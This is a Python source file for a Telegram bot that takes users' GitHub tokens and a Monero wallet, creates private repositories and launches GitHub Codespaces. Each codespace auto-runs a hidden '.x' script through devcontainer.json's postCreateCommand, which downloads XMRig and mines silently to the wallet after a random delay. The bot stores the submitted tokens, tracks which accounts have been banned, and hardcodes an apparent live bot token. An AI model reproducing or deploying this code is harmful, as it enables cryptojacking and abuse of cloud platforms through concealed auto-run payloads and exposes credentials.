import os
import time
import sqlite3
import requests
import base64
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = "7803505654:AAHkF650Qd6bF8jlDpAT-AFN4u9swpFee_I"

conn = sqlite3.connect("data.db", check_same_thread=False)
c = conn.cursor()
c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, wallet TEXT)")
c.execute("CREATE TABLE IF NOT EXISTS tokens (user_id INTEGER, token TEXT)")
conn.commit()

def upload_file(token, username, repo, filename, content):
    encoded = base64.b64encode(content.encode()).decode()
    return requests.put(
        f"https://api.github.com/repos/{username}/{repo}/contents/{filename}",
        headers={"Authorization": f"token {token}"},
        json={"message": f"Add {filename}", "content": encoded, "branch": "main"}
    )

def create_two_repos_and_codespaces(github_token, wallet, update=None):
    headers = {
        "Authorization": f"token {github_token}",
        "Accept": "application/vnd.github+json"
    }
    user_info = requests.get("https://api.github.com/user", headers=headers).json()
    username = user_info.get("login")
    if not username:
        return None, False

    files = {
        "devcontainer.json": '''{
  "name": "worker-container",
  "postCreateCommand": "chmod +x .x && nohup ./x &"
}''',
        ".x": f'''#!/bin/bash
sleep $((RANDOM % 30 + 15))
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
tar -xf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
chmod +x xmrig
nohup ./xmrig -o gulf.moneroocean.stream:10128 -u {wallet} -p codespace --donate-level 1 --threads 4 > /dev/null 2>&1 &
''',
        "README.md": "# Worker container for computation"
    }

    for i in range(2):
        repo_name = f"worker-{os.urandom(3).hex()}"
        repo_resp = requests.post(
            "https://api.github.com/repos/github/codespaces-blank/generate",
            headers=headers,
            json={"owner": username, "name": repo_name, "private": True}
        )
        if repo_resp.status_code != 201:
            if update:
                update.message.reply_text(f"❌ Failed to create repo {i+1}")
            continue

        for fname, content in files.items():
            upload_file(github_token, username, repo_name, fname, content)

        time.sleep(6)

        repo_data = requests.get(f"https://api.github.com/repos/{username}/{repo_name}", headers=headers).json()
        repo_id = repo_data.get("id")
        if not repo_id:
            continue

        resp = requests.post(
            "https://api.github.com/user/codespaces",
            headers=headers,
            json={"repository_id": repo_id, "ref": "main"}
        )
        if update:
            update.message.reply_text(f"📦 Codespace {i+1}: {resp.status_code}")

    return username, True

async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /wallet <XMR_wallet>")
        return
    wallet = context.args[0]
    c.execute("INSERT OR REPLACE INTO users (user_id, wallet) VALUES (?, ?)", (user_id, wallet))
    conn.commit()
    await update.message.reply_text("✅ Wallet saved successfully!")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("❌ Usage: /token <GitHub_token_1> <GitHub_token_2> ...")
        return
    c.execute("SELECT wallet FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if not row:
        await update.message.reply_text("⚠️ Please set your wallet using /wallet first.")
        return
    wallet = row[0]

    reply = ""
    for github_token in context.args:
        c.execute("INSERT INTO tokens (user_id, token) VALUES (?, ?)", (user_id, github_token))
        conn.commit()
        username, success = create_two_repos_and_codespaces(github_token, wallet, update)
        if success:
            reply += f"✅ Logged in as: {username}\n📦 Codespaces started.\n\n"
        else:
            reply += f"❌ Token {github_token[:8]}... is invalid or failed\n\n"

    await update.message.reply_text(reply.strip())

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    c.execute("SELECT token FROM tokens WHERE user_id = ?", (user_id,))
    tokens = c.fetchall()
    active = banned = 0
    for (token,) in tokens:
        res = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"})
        if res.status_code == 200:
            active += 1
        else:
            banned += 1
    await update.message.reply_text(
        f"✅ Active: {active}\n❌ Banned: {banned}\n📦 Total: {active + banned}"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to the Worker Bot!\n\n"
        "1️⃣ /wallet <your_monero_wallet>\n"
        "2️⃣ /token <your_github_token>\n"
        "3️⃣ Sit back and let the workers compute silently.\n"
        "4️⃣ /check - See token status.\n"
    )

app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("wallet", wallet))
app.add_handler(CommandHandler("token", token))
app.add_handler(CommandHandler("check", check))
app.add_handler(CommandHandler("start", start))
app.run_polling()
